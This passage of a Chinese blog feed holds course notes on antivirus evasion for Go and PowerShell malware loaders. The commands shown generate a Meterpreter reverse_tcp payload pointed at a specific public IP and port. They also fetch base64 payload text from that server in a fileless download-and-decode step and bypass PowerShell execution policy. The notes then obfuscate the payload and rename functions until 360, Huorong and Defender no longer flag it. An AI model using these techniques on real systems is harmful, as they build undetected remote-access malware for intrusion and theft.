src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180154517.png" alt="image-20230502180154517"></p><h6 id="执行命令生成exe文件"><a href="#执行命令生成exe文件" class="headerlink" title="执行命令生成exe文件"></a>执行命令生成exe文件</h6><p><strong><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180306962.png" alt="image-20230502180306962"></strong></p><h6 id="生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传"><a href="#生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传" class="headerlink" title="生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传"></a>生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180503650.png" alt="image-20230502180503650"></p><h5 id="3、Golang-分离式加载器-参数-amp-资源-4-amp-5-go"><a href="#3、Golang-分离式加载器-参数-amp-资源-4-amp-5-go" class="headerlink" title="3、Golang-分离式加载器-参数&amp;资源-4&amp;5.go"></a>3、Golang-分离式加载器-参数&amp;资源-4&amp;5.go</h5><p>加上去特征&amp;参数分离</p><h6 id="4-go-cs或msf生成raw格式"><a href="#4-go-cs或msf生成raw格式" class="headerlink" title="4.go:  cs或msf生成raw格式"></a>4.go:  cs或msf生成raw格式</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502201440785.png" alt="image-20230502201440785"></p><h6 id="5-go-过DF、x绒"><a href="#5-go-过DF、x绒" class="headerlink" title="5.go:(过DF、x绒)"></a>5.go:(过DF、x绒)</h6><h6 id="msfvenom-p-windows-x2F-x64-x2F-meterpreter-x2F-reverse-tcp-LHOST-x3D-47-94-236-117-LPORT-x3D-6688-f-hex"><a href="#msfvenom-p-windows-x2F-x64-x2F-meterpreter-x2F-reverse-tcp-LHOST-x3D-47-94-236-117-LPORT-x3D-6688-f-hex" class="headerlink" title="msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f hex"></a>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f hex</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502195050720.png" alt="image-20230502195050720"></p><h6 id="go-build-ldflags-“-s-w-H-x3D-windowsgui”-5-go（无弹窗）"><a href="#go-build-ldflags-“-s-w-H-x3D-windowsgui”-5-go（无弹窗）" class="headerlink" title="go build -ldflags “-s -w -H&#x3D;windowsgui” 5.go（无弹窗）"></a>go build -ldflags “-s -w -H&#x3D;windowsgui” 5.go（无弹窗）</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502194748743.png" alt="image-20230502194748743"></p><h5 id="4、Golang-保护混淆反调试器-通用"><a href="#4、Golang-保护混淆反调试器-通用" class="headerlink" title="4、Golang-保护混淆反调试器-通用"></a>4、Golang-保护混淆反调试器-通用</h5><h6 id="SafengineShielden"><a href="#SafengineShielden" class="headerlink" title="SafengineShielden"></a>SafengineShielden</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502200259376.png" alt="image-20230502200259376"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day109 免杀对抗-PowerShell&amp;混淆&amp;分离加载&amp;特征修改&amp;EXE生成&amp;填充替换</title>
    <link href="http://example.com/2023/04/27/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/"/>
    <id>http://example.com/2023/04/27/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/</id>
    <published>2023-04-27T00:33:57.000Z</published>
    <updated>2023-05-02T12:25:45.798Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Powershell-对变量数据做文章</p><p>2、Powershell-对Shellcode做文章</p><p>3、Powershell-对执行代码特征做文章</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h3 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h3><p>X60 Defender 某绒 管家 VT等</p><h3 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h3><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h3 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h3><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-PowerShell-文件模式-混淆过某绒"><a href="#➢-PowerShell-文件模式-混淆过某绒" class="headerlink" title="➢ PowerShell-文件模式-混淆过某绒"></a>➢ PowerShell-文件模式-混淆过某绒</h4><h4 id="➢-PowerShell-文件模式-分离过某60"><a href="#➢-PowerShell-文件模式-分离过某60" class="headerlink" title="➢ PowerShell-文件模式-分离过某60"></a>➢ PowerShell-文件模式-分离过某60</h4><h4 id="➢-PowerShell-文件模式-特征修改过DF"><a href="#➢-PowerShell-文件模式-特征修改过DF" class="headerlink" title="➢ PowerShell-文件模式-特征修改过DF"></a>➢ PowerShell-文件模式-特征修改过DF</h4><h4 id="➢-PowerShell-EXE模式-Ladon-amp-Win-PS2"><a href="#➢-PowerShell-EXE模式-Ladon-amp-Win-PS2" class="headerlink" title="➢ PowerShell-EXE模式-Ladon&amp;Win-PS2"></a>➢ PowerShell-EXE模式-Ladon&amp;Win-PS2</h4><h4 id="➢-PowerShell-命令模式-加载-amp-替换-amp-填充等"><a href="#➢-PowerShell-命令模式-加载-amp-替换-amp-填充等" class="headerlink" title="➢ PowerShell-命令模式-加载&amp;替换&amp;填充等"></a>➢ PowerShell-命令模式-加载&amp;替换&amp;填充等</h4></blockquote><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151636422.png" alt="image-20230430151636422"></p><h6 id="文件模式内容："><a href="#文件模式内容：" class="headerlink" title="文件模式内容："></a>文件模式内容：</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151359510.png" alt="image-20230430151359510"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151746979.png" alt="image-20230430151746979"></p><h3 id="PowerShell-文件模式-混淆过某绒"><a href="#PowerShell-文件模式-混淆过某绒" class="headerlink" title="#PowerShell-文件模式-混淆过某绒"></a>#PowerShell-文件模式-混淆过某绒</h3><h5 id="1、手工混淆：变量进行编码后解码"><a href="#1、手工混淆：变量进行编码后解码" class="headerlink" title="1、手工混淆：变量进行编码后解码"></a>1、手工混淆：变量进行编码后解码</h5><h5 id="bb-x3D-System-Text-Encoding-ASCII-GetString-System-Convert-FromBase64String-x"><a href="#bb-x3D-System-Text-Encoding-ASCII-GetString-System-Convert-FromBase64String-x" class="headerlink" title="$bb&#x3D;[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($x))"></a>$bb&#x3D;[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($x))</h5><h5 id="powershell-ExecutionPolicy-bypass-File-hr-ps1"><a href="#powershell-ExecutionPolicy-bypass-File-hr-ps1" class="headerlink" title="powershell -ExecutionPolicy bypass -File hr.ps1"></a>powershell -ExecutionPolicy bypass -File hr.ps1</h5><h6 id="将执行上线的代码base64加密"><a href="#将执行上线的代码base64加密" class="headerlink" title="将执行上线的代码base64加密"></a>将执行上线的代码base64加密</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430153852001.png" alt="image-20230430153852001"></p><h6 id="加密后放进去，进行解密"><a href="#加密后放进去，进行解密" class="headerlink" title="加密后放进去，进行解密"></a>加密后放进去，进行解密</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430153827645.png" alt="image-20230430153827645"></p><h6 id="发现不会被查杀"><a href="#发现不会被查杀" class="headerlink" title="发现不会被查杀"></a>发现不会被查杀</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154033273.png" alt="image-20230430154033273"></p><h5 id="2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）"><a href="#2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）" class="headerlink" title="2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）"></a>2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）</h5><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430162012079.png" alt="image-20230430162012079"></p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><ul><li>加载模块：Import-Module .&#x2F;Invoke-Obfuscation.psd1</li><li>运行程序：Invoke-Obfuscation</li><li>处理文件：set scriptpath C:\Users\86135\Desktop\1.ps1</li><li>处理代码：set scriptblock ‘xxxx’  （处理某个地方的代码，不需要则不用输入这个命令）</li><li>进入编码：encoding</li><li><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430161718165.png" alt="image-20230430161718165"></li><li>选择编码：1-8</li><li>输出文件：out C:\Users\86135\Desktop\11.ps1  （输出为指定文件）</li></ul><h6 id="在编码后的内容加入其他字母混淆"><a href="#在编码后的内容加入其他字母混淆" class="headerlink" title="在编码后的内容加入其他字母混淆"></a>在编码后的内容加入其他字母混淆</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154426457.png" alt="image-20230430154426457"></p><h6 id="加入后是无法进行base64-解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行"><a href="#加入后是无法进行base64-解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行" class="headerlink" title="加入后是无法进行base64 解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行"></a>加入后是无法进行base64 解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154836782.png" alt="image-20230430154836782"></p><h6 id="能过x绒，但是还是无法过x60的"><a href="#能过x绒，但是还是无法过x60的" class="headerlink" title="能过x绒，但是还是无法过x60的"></a>能过x绒，但是还是无法过x60的</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430155422780.png" alt="image-20230430155422780"></p><h6 id="在原型-未加密-的代码中插入字符串，再进行编码"><a href="#在原型-未加密-的代码中插入字符串，再进行编码" class="headerlink" title="在原型(未加密)的代码中插入字符串，再进行编码"></a>在原型(未加密)的代码中插入字符串，再进行编码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430155615622.png" alt="image-20230430155615622"></p><h6 id="解码后，在执行处将其替换为空还原代码"><a href="#解码后，在执行处将其替换为空还原代码" class="headerlink" title="解码后，在执行处将其替换为空还原代码"></a>解码后，在执行处将其替换为空还原代码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160113562.png" alt="image-20230430160113562"></p><h6 id="还是无法过x60"><a href="#还是无法过x60" class="headerlink" title="还是无法过x60"></a>还是无法过x60</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160145157.png" alt="image-20230430160145157"></p><h3 id="PowerShell-文件模式-分离过某60"><a href="#PowerShell-文件模式-分离过某60" class="headerlink" title="#PowerShell-文件模式-分离过某60"></a>#PowerShell-文件模式-分离过某60</h3><blockquote><h5 id="混淆无文件："><a href="#混淆无文件：" class="headerlink" title="混淆无文件："></a>混淆无文件：</h5><h5 id="无文件："><a href="#无文件：" class="headerlink" title="无文件："></a>无文件：</h5><p>$d&#x3D; ((New-Object System.Net.Webclient).DownloadString(‘<a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>‘))</p><h5 id="解码："><a href="#解码：" class="headerlink" title="解码："></a>解码：</h5><p>$x&#x3D;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))</p><p><a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>  &#x3D;  $d base64数据</p><p>$d&#x3D; ((New-Object System.Net.Webclient).DownloadString(‘<a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>‘))</p><p>$x&#x3D;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))</p></blockquote><h6 id="将上线文件base64编码放到远程服务器保存为1-txt，将查杀文件分离出去"><a href="#将上线文件base64编码放到远程服务器保存为1-txt，将查杀文件分离出去" class="headerlink" title="将上线文件base64编码放到远程服务器保存为1.txt，将查杀文件分离出去"></a>将上线文件base64编码放到远程服务器保存为1.txt，将查杀文件分离出去</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230501172705835.png" alt="image-20230501172705835"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160424943.png" alt="image-20230430160424943"></p><h6 id="执行文件里面加载远程的上线代码"><a href="#执行文件里面加载远程的上线代码" class="headerlink" title="执行文件里面加载远程的上线代码"></a>执行文件里面加载远程的上线代码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160927672.png" alt="image-20230430160927672"></p><h6 id="可过x60，但是无法过DF"><a href="#可过x60，但是无法过DF" class="headerlink" title="可过x60，但是无法过DF"></a>可过x60，但是无法过DF</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430161359782.png" alt="image-20230430161359782"></p><h3 id="PowerShell-文件模式-特征修改过DF"><a href="#PowerShell-文件模式-特征修改过DF" class="headerlink" title="#PowerShell-文件模式-特征修改过DF"></a>#PowerShell-文件模式-特征修改过DF</h3><p>Fuzz DF查杀特征</p><h5 id="1、Shellcode换格式"><a href="#1、Shellcode换格式" class="headerlink" title="1、Shellcode换格式"></a>1、Shellcode换格式</h5><h5 id="2、变量名-amp-函数名全修改"><a href="#2、变量名-amp-函数名全修改" class="headerlink" title="2、变量名&amp;函数名全修改"></a>2、变量名&amp;函数名全修改</h5><h6 id="base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单"><a href="#base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单" class="headerlink" title="base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单"></a>base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430162417120.png" alt="image-20230430162417120"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430164544923.png" alt="image-20230430164544923"></p><h6 id="所以只能在代码中进行修改了"><a href="#所以只能在代码中进行修改了" class="headerlink" title="所以只能在代码中进行修改了"></a>所以只能在代码中进行修改了</h6><h6 id="将这里面的执行的函数都进行更改"><a href="#将这里面的执行的函数都进行更改" class="headerlink" title="将这里面的执行的函数都进行更改"></a>将这里面的执行的函数都进行更改</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430164723195.png" alt="image-20230430164723195"></p><h6 id="用到脚本，将上面base64编码的内容再次bit流编码"><a href="#用到脚本，将上面base64编码的内容再次bit流编码" class="headerlink" title="用到脚本，将上面base64编码的内容再次bit流编码"></a>用到脚本，将上面base64编码的内容再次bit流编码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430165625116.png" alt="image-20230430165625116"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430170016846.png" alt="image-20230430170016846"></p><h6 id="再替换函数和方法名"><a href="#再替换函数和方法名" class="headerlink" title="再替换函数和方法名"></a>再替换函数和方法名</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430171527285.png" alt="image-20230430171527285"></p><h6 id="此处的-Dolt也替换一下"><a href="#此处的-Dolt也替换一下" class="headerlink" title="此处的$Dolt也替换一下"></a>此处的$Dolt也替换一下</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172123808.png" alt="image-20230430172123808"></p><h6 id="执行上线成功，没有被杀"><a href="#执行上线成功，没有被杀" class="headerlink" title="执行上线成功，没有被杀"></a>执行上线成功，没有被杀</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172210902.png" alt="image-20230430172210902"></p><h3 id="PowerShell-EXE模式-Ladon-amp-Win-PS2"><a href="#PowerShell-EXE模式-Ladon-amp-Win-PS2" class="headerlink" 